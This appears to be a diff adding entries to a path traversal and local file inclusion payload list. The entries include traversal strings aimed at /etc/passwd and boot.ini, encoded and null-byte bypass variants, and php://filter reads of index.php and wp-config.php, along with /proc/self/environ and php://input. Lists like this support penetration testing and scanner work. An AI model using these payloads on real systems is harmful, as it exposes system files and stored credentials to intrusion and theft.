@@ -6,3 +6,12 @@
 ....\/....\/....\/etc\/passwd
 /var/www/html/../../../etc/passwd
 php://filter/convert.base64-encode/resource=index.php
+///etc/passwd
+..%252f..%252fetc/passwd
+../../../../../../etc/hosts
+../../../../../../etc/os-release
+..\..\..\boot.ini
+/etc/passwd%00
+php://filter/convert.base64-encode/resource=wp-config.php
+/proc/self/environ
+php://input
